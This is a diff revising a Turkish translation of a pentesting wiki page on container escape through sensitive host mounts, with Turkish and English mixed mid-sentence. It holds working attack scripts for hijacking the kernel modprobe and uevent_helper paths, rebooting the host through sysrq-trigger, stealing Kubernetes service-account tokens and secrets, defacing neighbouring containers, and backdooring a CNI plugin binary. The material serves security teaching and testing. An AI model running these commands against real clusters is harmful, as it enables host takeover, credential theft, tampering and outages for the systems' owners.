@@ -1,18 +1,18 @@
-# Hassas Host Mount'ları
+# Sensitive Host Mounts
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Genel Bakış
 
-Host mount'ları, dikkatle izole edilmiş bir süreç görünümünü sıklıkla host kaynaklarının doğrudan görünürlüğüne geri çevirdikleri için pratikteki en önemli container-escape yüzeylerinden biridir. Tehlikeli vakalar sadece `/` ile sınırlı değildir. `/proc`, `/sys`, `/var` bind mount'ları, runtime socket'leri, kubelet tarafından yönetilen state veya cihazla ilgili yollar kernel kontrollerini, kimlik bilgilerini, komşu container dosya sistemlerini ve runtime yönetim arayüzlerini ortaya çıkarabilir.
+Host mounts, en önemli pratik container-escape yüzeylerinden biridir; çünkü çoğu zaman dikkatle izole edilmiş bir process görünümünü doğrudan host kaynaklarının görünürlüğüne geri çevirir. Tehlikeli durumlar yalnızca `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state veya device ile ilgili path’lerin bind mount edilmesi; kernel kontrollerini, credentials'ları, komşu container filesystem'lerini ve runtime yönetim arayüzlerini açığa çıkarabilir.
 
-Bu sayfa, kötüye kullanım modeli kesişen bir nitelikte olduğu için bireysel koruma sayfalarından ayrı tutulmuştur. Bir yazılabilir host mount kısmen mount namespaces, kısmen user namespaces, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi kesin host yolunun açığa çıkarıldığı nedeniyle tehlikelidir. Bunu kendi başına bir konu olarak ele almak saldırı yüzeyini anlamayı kolaylaştırır.
+Bu sayfa, bireysel protection sayfalarından ayrı olarak vardır; çünkü abuse modeli kesişimseldir. Yazılabilir bir host mount tehlikelidir; bunun bir kısmı mount namespaces, bir kısmı user namespaces, bir kısmı AppArmor veya SELinux kapsamı ve bir kısmı da tam olarak hangi host path'inin açığa çıkarıldığı ile ilgilidir. Bunu kendi başına bir konu olarak ele almak, attack surface'i çok daha kolay anlamayı sağlar.
 
-## /proc Açığa Çıkması
+## `/proc` Exposure
 
-procfs hem sıradan süreç bilgilerini hem de yüksek etkiye sahip kernel kontrol arayüzlerini içerir. `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik yazılabilir proc girdilerini açığa çıkaran bir container görünümü bilgi sızıntısına, hizmet reddine veya doğrudan host kodu yürütülmesine yol açabilir.
+procfs, hem sıradan process bilgilerini hem de yüksek etkili kernel control arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik writable proc girişlerini açığa çıkaran bir container görünümü, bilgi sızıntısına, denial of service'e veya doğrudan host code execution'a yol açabilir.
 
-Yüksek değere sahip procfs yolları şunlardır:
+Yüksek değerli procfs path'leri şunları içerir:
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
@@ -29,9 +29,9 @@ Yüksek değere sahip procfs yolları şunlardır:
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
-### Kötüye Kullanım
+### Abuse
 
-Başlangıç olarak hangi yüksek değerli procfs girdilerinin görünür veya yazılabilir olduğunu kontrol edin:
+Önce hangi yüksek değerli procfs girdilerinin görünür veya yazılabilir olduğunu kontrol ederek başlayın:
 ```bash
 for p in \
 /proc/sys/kernel/core_pattern \
@@ -46,47 +46,47 @@ for p in \
 [ -e "$p" ] && ls -l "$p"
 done
 ```
-These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.
+These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are güçlü reconnaissance kaynakları for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.
 
-Her yolun pratik değeri farklıdır; hepsinin aynı etkiye sahipmiş gibi davranmak triage'ı zorlaştırır:
+The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:
 
 - `/proc/sys/kernel/core_pattern`
-Yazılabilir ise, kernel çöktüğünde bir pipe handler çalıştıracağı için en yüksek etkili procfs yollarından biridir. Overlay'unda depolanmış veya monte edilmiş bir host yolundaki bir payload'a `core_pattern`'i işaret edebilen bir container genellikle host code-execution elde edebilir. Özel bir örnek için [read-only-paths.md](protections/read-only-paths.md)'ye bakın.
+If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
 - `/proc/sys/kernel/modprobe`
-Bu yol, kernel modül yükleme mantığını tetiklemesi gerektiğinde kullandığı userspace helper'ı kontrol eder. Container'dan yazılabilir ve host bağlamında yorumlanırsa, başka bir host code-execution primitive'i haline gelebilir. Helper yolunu tetikleyecek bir yöntemle birleştirildiğinde özellikle ilgi çekicidir.
+This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
 - `/proc/sys/vm/panic_on_oom`
-Genellikle temiz bir escape primitive'i değildir, ama OOM durumlarını kernel panic davranışına çevirerek bellek baskısını host-genelinde bir denial of service'e dönüştürebilir.
+This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
 - `/proc/sys/fs/binfmt_misc`
-Kayıt arayüzü yazılabilir ise, saldırgan seçilen bir magic değer için bir handler kaydedebilir ve eşleşen bir dosya çalıştırıldığında host-context execution elde edebilir.
+If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
 - `/proc/config.gz`
-kernel exploit triage için faydalıdır. Hangi alt sistemlerin, mitigations'ın ve isteğe bağlı kernel özelliklerinin etkin olduğunu host package metadata'ya ihtiyaç duymadan belirlemeye yardımcı olur.
+Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
 - `/proc/sysrq-trigger`
-Çoğunlukla bir denial-of-service yoludur, ancak çok ciddi bir yol. Host'u hemen reboot, panic veya başka şekillerde bozabilir.
+Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
 - `/proc/kmsg`
-Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting, crash analysis için yararlı ve bazı ortamlarda kernel exploitation için faydalı bilgilerin leak edilmesine yardımcı olur.
+Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
 - `/proc/kallsyms`
-Okunabilir olduğunda değerlidir çünkü export edilmiş kernel sembol bilgilerini açığa çıkarır ve kernel exploit development sırasında address randomization varsayımlarını çürütmeye yardımcı olabilir.
+Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
 - `/proc/[pid]/mem`
-Doğrudan bir process-memory arabirimidir. Hedef süreç gerekli ptrace-style koşullarıyla ulaşılabilirse, başka bir sürecin belleğini okumaya veya değiştirmeye izin verebilir. Gerçek etkisi kimlik bilgileri, `hidepid`, Yama ve ptrace kısıtlamalarına büyük ölçüde bağlıdır; bu yüzden güçlü ama koşullu bir yoldur.
+This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
 - `/proc/kcore`
-Sistem belleğinin core-image-style görünümünü açığa çıkarır. Dosya devasa ve kullanımı hantal olmakla birlikte, anlamlı şekilde okunabiliyorsa kötü şekilde açığa çıkmış bir host memory surface'i gösterir.
+Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
 - `/proc/kmem` and `/proc/mem`
-Tarihte yüksek etkili ham bellek arabirimleri. Birçok modern sistemde devre dışı bırakılmış veya sıkı kısıtlanmıştır; ancak mevcut ve kullanılabiliyorlarsa kritikal bulgu olarak değerlendirilmelidir.
+Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
 - `/proc/sched_debug`
-Leaks scheduling ve task bilgilerini; bu, diğer process görünümleri beklendiğinden daha temiz görünse bile host process kimliklerini açığa çıkarabilir.
+Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
 - `/proc/[pid]/mountinfo`
-Host üzerinde container'ın gerçekte nerede olduğunu, hangi yolların overlay-backed olduğunu ve yazılabilir bir mount'un host içeriğine mi yoksa sadece container katmanına mı karşılık geldiğini yeniden oluşturmak için son derece yararlıdır.
+Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.
 
 If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
-Bu komutlar kullanışlıdır çünkü host üzerinde yürütme gerektiren birçok hile, konteyner içindeki bir yolu host'un gördüğü karşılık gelen yola çevirmeyi gerektirir.
+Bu komutlar faydalıdır çünkü birçok host-execution hilesi, container içindeki bir path’i host’un bakış açısından karşılık gelen path’e dönüştürmeyi gerektirir.
 
-### Tam Örnek: `modprobe` Helper Path Abuse
+### Full Example: `modprobe` Helper Path Abuse
 
-Eğer `/proc/sys/kernel/modprobe` konteynerden yazılabiliyorsa ve helper path host bağlamında yorumlanıyorsa, bu bir saldırgan kontrollü payload'a yönlendirilebilir:
+Eğer `/proc/sys/kernel/modprobe` container’dan yazılabilir durumdaysa ve helper path host bağlamında yorumlanıyorsa, saldırganın kontrol ettiği bir payload’a yönlendirilebilir:
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -98,31 +98,31 @@ chmod +x /tmp/modprobe-payload
 echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
 cat /proc/sys/kernel/modprobe
 ```
-Tam tetikleyici hedefe ve kernel davranışına bağlıdır; ancak önemli nokta, bir writable helper path'in gelecekteki bir kernel helper invocation'ı attacker-controlled host-path content'e yönlendirebilmesidir.
+Tam tetikleyici hedefe ve kernel davranışına bağlıdır, ancak önemli nokta şudur: yazılabilir bir helper path, gelecekteki bir kernel helper çağrısını saldırganın kontrolündeki host-path içeriğine yönlendirebilir.
 
 ### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`
 
-Hedef immediate escape yerine exploitability assessment ise:
+Eğer amaç doğrudan escape yerine exploitability assessment ise:
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
 dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
-Bu komutlar, faydalı sembol bilgisinin görünür olup olmadığını, son kernel mesajlarının ilginç durumları açığa vurup vurmadığını ve hangi kernel özellikleri veya mitigations derlenmiş durumda olduğunu belirlemeye yardımcı olur. Etkisi genellikle doğrudan escape sağlamaz, ancak kernel-vulnerability triyajını keskin şekilde kısaltabilir.
+Bu komutlar, yararlı symbol bilgilerin görünür olup olmadığını, son kernel mesajlarının ilginç durum ortaya çıkarıp çıkarmadığını ve hangi kernel özellikleri veya mitigations’ın derlenmiş olduğunu anlamaya yardımcı olur. Etkisi genellikle doğrudan escape değildir, ancak kernel-vulnerability triage süresini ciddi şekilde kısaltabilir.
 
-### Tam Örnek: SysRq Host Reboot
+### Full Example: SysRq Host Reboot
 
-Eğer `/proc/sysrq-trigger` yazılabiliyorsa ve host görünümüne ulaşabiliyorsa:
+Eğer `/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne ulaşıyorsa:
 ```bash
 echo b > /proc/sysrq-trigger
 ```
-Etkisi hemen sunucunun yeniden başlatılmasıdır. Bu ince bir örnek değil, ama procfs maruziyetinin bilgi ifşasından çok daha ciddi olabileceğini açıkça gösteriyor.
+Etkisi anında host yeniden başlatmadır. Bu ince bir örnek değildir, ancak `procfs` exposure'un information disclosure'dan çok daha ciddi olabileceğini açıkça gösterir.
 
-## `/sys` Maruziyeti
+## `/sys` Exposure
 
-sysfs, çekirdek ve cihaz durumunun büyük miktarını açığa çıkarır. Bazı sysfs yolları esas olarak fingerprinting için kullanışlıdır, diğerleri ise helper execution'ı, cihaz davranışını, security-module yapılandırmasını veya firmware durumunu etkileyebilir.
+`sysfs`, büyük miktarda kernel ve device state ortaya çıkarır. Bazı `sysfs` paths esas olarak fingerprinting için kullanışlıdır, diğerleri ise helper execution, device behavior, security-module configuration veya firmware state'i etkileyebilir.
 
-Yüksek değerli sysfs yolları şunlardır:
+Yüksek değerli `sysfs` paths şunları içerir:
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -132,9 +132,9 @@ Yüksek değerli sysfs yolları şunlardır:
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, termal yönetim davranışını etkileyebilir ve bu nedenle kötü şekilde açığa çıkarılmış ortamlarda sunucu kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo` crash-dump ve kernel-layout bilgilerini leak edebilir; bu, düşük seviyeli host fingerprinting için yardımcı olur. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; burada beklenmedik erişim MAC-related state'i ifşa edebilir veya değiştirebilir. EFI değişken yolları firmware-destekli önyükleme ayarlarını etkileyebilir; bu da onları sıradan konfigürasyon dosyalarından çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü kasıtlı olarak geliştirici odaklı bir arayüzdür ve sertleştirilmiş, üretim odaklı çekirdek API'lerine kıyasla çok daha az güvenlik beklentisi vardır.
+Bu paths farklı nedenlerle önemlidir. `/sys/class/thermal`, thermal-management davranışını etkileyebilir ve bu nedenle kötü açığa çıkarılmış ortamlarda host stability'yi etkileyebilir. `/sys/kernel/vmcoreinfo`, low-level host fingerprinting'e yardımcı olan crash-dump ve kernel-layout information sızıntısı yapabilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` interface'idir; bu nedenle buradaki beklenmeyen access, MAC ile ilgili state'i ifşa edebilir veya değiştirebilir. EFI variable paths, firmware-backed boot settings'i etkileyebilir; bu da onları sıradan configuration files'tan çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü kasıtlı olarak developer-oriented bir interface'tir ve hardened production-facing kernel APIs'e kıyasla çok daha az safety expectation'a sahiptir.
 
-Bu yolları incelemek için faydalı komutlar şunlardır:
+Bu paths için faydalı review commands şunlardır:
 ```bash
 find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
@@ -142,17 +142,17 @@ find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
-What makes those commands interesting:
+Bu komutları ilginç yapan şey:
 
-- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
-- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
-- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
-- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
-- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.
+- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM surface’inin host-only kalması gerekirken görünür olup olmadığını ortaya çıkarabilir.
+- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgu olur. `debugfs` mount edilmiş ve okunabilir ya da yazılabilirse, etkinleştirilmiş debug node’larına bağlı olarak tam riski değişen geniş bir kernel-facing surface bekleyin.
+- EFI variable exposure daha az yaygındır, ancak varsa etkisi büyüktür çünkü sıradan runtime dosyaları yerine firmware-backed ayarlara dokunur.
+- `/sys/class/thermal` esas olarak host stabilitesi ve donanım etkileşimiyle ilgilidir, temiz bir shell-style escape ile değil.
+- `/sys/kernel/vmcoreinfo` esas olarak host fingerprinting ve crash-analysis kaynağıdır, düşük seviyeli kernel durumunu anlamak için faydalıdır.
 
-### Tam Örnek: `uevent_helper`
+### Full Example: `uevent_helper`
 
-Eğer `/sys/kernel/uevent_helper` yazılabiliyorsa, bir `uevent` tetiklendiğinde kernel saldırgan kontrollü bir yardımcı programı çalıştırabilir:
+Eğer `/sys/kernel/uevent_helper` yazılabilir ise, kernel bir `uevent` tetiklendiğinde saldırgan tarafından kontrol edilen bir helper çalıştırabilir:
 ```bash
 cat <<'EOF' > /evil-helper
 #!/bin/sh
@@ -164,50 +164,100 @@ echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 echo change > /sys/class/mem/null/uevent
 cat /output
 ```
-Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container içinde değil host bağlamında çalışır.
+Bunun çalışmasının nedeni, yardımcı yolunun host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde, helper mevcut container içinde değil, host context'inde çalışır.
 
-## `/var` Maruziyeti
+## `/var` Exposure
 
-Host'un `/var` dizinini bir container'a mount etmek sıklıkla küçümsenir çünkü `/`'i mount etmek kadar dramatik görünmez. Pratikte bu, runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens ve komşu uygulama filesystem'lerine erişmek için yeterli olabilir. Modern node'larda, `/var` genellikle en operasyonel açıdan ilginç container durumunun bulunduğu yerdir.
+Host'un `/var` dizinini bir container'a mount etmek, `/` mount etmek kadar dramatik görünmediği için çoğu zaman hafife alınır. Pratikte, runtime socket'lerine, container snapshot dizinlerine, kubelet-managed pod volume'larına, projected service-account token'larına ve komşu application filesystem'lerine ulaşmak için yeterli olabilir. Modern node'larda `/var`, çoğu zaman operasyonel olarak en ilgi çekici container state'inin gerçekten bulunduğu yerdir.
 
-### Kubernetes Örneği
+### Kubernetes Example
 
-hostPath: /var olan bir pod genellikle diğer pod'ların projected tokens ve overlay snapshot içeriğini okuyabilir:
+`hostPath: /var` olan bir pod, çoğu zaman diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
 ```bash
 find /host-var/ -type f -iname '*.env*' 2>/dev/null
 find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
-Bu komutlar, mount'ın yalnızca önemsiz uygulama verilerini mi yoksa yüksek etkili cluster credentials'ı mı açığa çıkardığını gösterdikleri için faydalıdır. Okunabilir bir service-account token, local code execution'ı hemen Kubernetes API erişimine dönüştürebilir.
+Bu komutlar yararlıdır çünkü mount’un yalnızca sıradan uygulama verilerini mi yoksa yüksek etkili cluster credentials mı açığa çıkardığını söyler. Okunabilir bir service-account token, local code execution’ı hemen Kubernetes API access’e dönüştürebilir.
 
-Token mevcutsa, token keşfinde durmak yerine nereye erişebildiğini doğrulayın:
+Token mevcutsa, token keşfinde durmak yerine neye erişebildiğini doğrulayın:
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
-Buradaki etki yerel düğüm erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token monte edilmiş bir `/var` dizinini tüm küme için ele geçirilmiş hale getirebilir.
+Buradaki etki, local node access'ten çok daha büyük olabilir. Geniş RBAC'e sahip bir token, mount edilmiş bir `/var`'ı cluster-wide compromise'a çevirebilir.
 
-### Docker ve containerd Örneği
+### Docker And containerd Example
 
-Docker hostlarında ilgili veriler genellikle `/var/lib/docker` altında bulunur; containerd destekli Kubernetes düğümlerinde ise `/var/lib/containerd` veya snapshotter-özgü yollar altında olabilir:
+Docker host'larında ilgili veriler çoğu zaman `/var/lib/docker` altındadır, containerd-backed Kubernetes node'larında ise `/var/lib/containerd` ya da snapshotter-specific paths altında olabilir:
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
 find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
-Mount edilmiş `/var`, başka bir workload'un yazılabilir snapshot içeriğini açıyorsa, saldırgan mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya startup script'lerini değiştirebilir.
+Eğer mount edilen `/var`, başka bir workload’un yazılabilir snapshot içeriğini açığa çıkarıyorsa, saldırgan application dosyalarını değiştirebilir, web content yerleştirebilir veya current container configuration’a dokunmadan startup scripts’i değiştirebilir.
 
-Yazılabilir snapshot içeriği bulunduğunda somut istismar fikirleri:
+Yazılabilir snapshot content bulunduğunda uygulanabilecek somut abuse fikirleri:
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
 ```
-Bu komutlar faydalıdır çünkü bağlanmış `/var`'ın üç ana etki ailesini gösterir: application tampering, secret recovery ve lateral movement into neighboring workloads.
+Bu komutlar faydalıdır çünkü mount edilmiş `/var` için üç ana etki ailesini gösterirler: application tampering, secret recovery ve komşu workloads içine lateral movement.
 
-## Çalışma Zamanı Soketleri
+## Kubelet State, Plugins, And CNI Paths
 
-Duyarlı host mount'ları genellikle tam dizinler yerine çalışma zamanı soketlerini içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar vurgulanmayı hak ederler:
+`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount’u çoğu zaman privileged DaemonSets, CNI agents, CSI node plugins, GPU operators ve storage helpers üzerinden açığa çıkar. Bu mount’lar kolayca "node plumbing" olarak göz ardı edilir, ancak yeni pods için execution path üzerinde doğrudan yer alırlar ve çoğu zaman kubelet credentials, projected secrets, registration sockets ve executable host-side plugin binaries içerirler.
+
+High-value targets şunlardır:
+
+- `/var/lib/kubelet/pki`
+- `/var/lib/kubelet/pods`
+- `/var/lib/kubelet/device-plugins/kubelet.sock`
+- `/var/lib/kubelet/pod-resources/kubelet.sock`
+- `/var/lib/kubelet/plugins`
+- `/var/lib/kubelet/plugins_registry`
+- `/opt/cni/bin`
+- `/etc/cni/net.d`
+
+Useful review commands are:
+```bash
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
+egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
+find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
+grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
+```
+Bu yolların neden önemli olduğu:
+
+- `/var/lib/kubelet/pki`, kubelet client certificates ve diğer node-local credentials’ları açığa çıkarabilir; bunlar cluster tasarımına bağlı olarak bazen API server veya kubelet-facing TLS endpoints’e karşı yeniden kullanılabilir.
+- `/var/lib/kubelet/pods` çoğu zaman aynı node üzerindeki komşu pods için projected service-account tokens ve mounted Secrets içerir.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` esasen bir reconnaissance yüzeyidir, ama çok kullanışlıdır: hangi pods ve containers’ın şu anda GPUs, hugepages, SR-IOV devices ve diğer kıt node-local resources üzerinde hak sahibi olduğunu gösterir.
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugins’in kurulu olduğunu ve kubelet’in hangi sockets ile konuşmasının beklendiğini gösterir. Bu dizinler yalnızca readable değil de writable ise, bulgu çok daha ciddi hale gelir.
+- `/opt/cni/bin` ve `/etc/cni/net.d` doğrudan pod-network kurulum yolunun üzerindedir. Burada writable access çoğu zaman sadece configuration exposure değil, gecikmeli bir host-execution primitive anlamına gelir.
+
+### Full Example: Writable `/opt/cni/bin`
+
+Eğer bir host CNI binary directory read-write olarak mount edildiyse, bir plugin’i değiştirmek, kubelet o node üzerinde bir sonraki kez bir pod sandbox oluşturduğunda host execution elde etmek için yeterli olabilir:
+```bash
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
+grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+[ -n "$plugin" ] || exit 1
+mv "$plugin" "${plugin}.orig"
+cat <<'EOF' > "$plugin"
+#!/bin/sh
+id > /tmp/cni-triggered
+exec "$(dirname "$0")/$(basename "$0").orig" "$@"
+EOF
+chmod +x "$plugin"
+echo "wait for the next pod scheduled on this node"
+```
+Bu, mount edilmiş bir `docker.sock` kadar acil değildir, ancak çoğu zaman ele geçirilmiş Kubernetes infrastructure pod'larında daha gerçekçidir. Önemli nokta, değiştirilmiş binary'nin daha sonra current container tarafından değil, host network setup flow tarafından çalıştırılmasıdır.
+
+
+## Runtime Sockets
+
+Sensitive host mounts çoğu zaman tam dizinler yerine runtime sockets içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar edilmeyi hak ederler:
 ```text
 /run/containerd/containerd.sock
 /var/run/crio/crio.sock
@@ -216,38 +266,48 @@ Duyarlı host mount'ları genellikle tam dizinler yerine çalışma zamanı soke
 /var/run/kubelet.sock
 /run/firecracker-containerd.sock
 ```
-Bu sockets'lerden biri mounted olduğunda, tam exploitation flows için bkz. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md).
+Tam bu socket'lerden biri mount edildikten sonra tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) bölümüne bakın.
 
-Hızlı bir ilk etkileşim deseni:
+Hızlı bir ilk etkileşim paterni olarak:
 ```bash
 docker -H unix:///host/run/docker.sock version 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
-Eğer bunlardan biri başarılı olursa, "mounted socket" ile "start a more privileged sibling container" arasındaki yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.
+Eğer bunlardan biri başarılı olursa, "mounted socket"tan "daha ayrıcalıklı bir sibling container başlatma"ya giden yol genelde herhangi bir kernel breakout yolundan çok daha kısadır.
 
-## Mount ile İlgili CVE'ler
+## Mount-Related CVEs
 
-Host mount'ları ayrıca runtime zafiyetleriyle de kesişir. Önemli yakın dönem örnekleri şunlardır:
+Host mounts ayrıca runtime vulnerabilities ile kesişir. Önemli son örnekler şunları içerir:
 
-- `CVE-2024-21626` `runc`'ta, leaked bir dizin dosya tanımlayıcısının çalışma dizinini host dosya sistemine yerleştirebilmesi.
-- `CVE-2024-23651` ve `CVE-2024-23653` BuildKit'te, OverlayFS copy-up yarışlarının derlemeler sırasında host-path yazmalarına yol açabilmesi.
-- `CVE-2024-1753` Buildah ve Podman build akışlarında, build sırasında özel hazırlanmış bind mount'ların `/`'i okunur-yazılır hale getirebilmesi.
-- `CVE-2024-40635` containerd'de, büyük bir `User` değerinin taşarak UID 0 davranışına sebep olabilmesi.
+- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
+- `CVE-2024-23651`, `CVE-2024-23652`, and `CVE-2024-23653` in BuildKit, where malicious Dockerfiles, frontends, and `RUN --mount` flows could reintroduce host file access, deletion, or elevated privileges during builds.
+- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
+- `CVE-2025-47290` in `containerd` 2.1.0, where a TOCTOU during image unpack could let a specially crafted image modify the host filesystem during pull.
 
-Bu CVE'ler burada önemlidir çünkü mount işlemenin yalnızca operatör konfigürasyonu meselesi olmadığını gösterir. Runtime'ın kendisi de mount kaynaklı kaçış koşulları yaratabilir.
+Bu CVE'ler burada önemlidir çünkü mount handling'in sadece operator configuration ile ilgili olmadığını gösterirler. Runtime'ın kendisi de mount-driven escape conditions ekleyebilir.
 
-## Kontroller
+## Checks
 
-En yüksek değerli mount maruziyetlerini hızlıca bulmak için bu komutları kullanın:
+Bu komutları kullanarak en yüksek değerli mount exposures'ları hızlıca bulun:
 ```bash
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
 find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
+Burada ilginç olan:
+
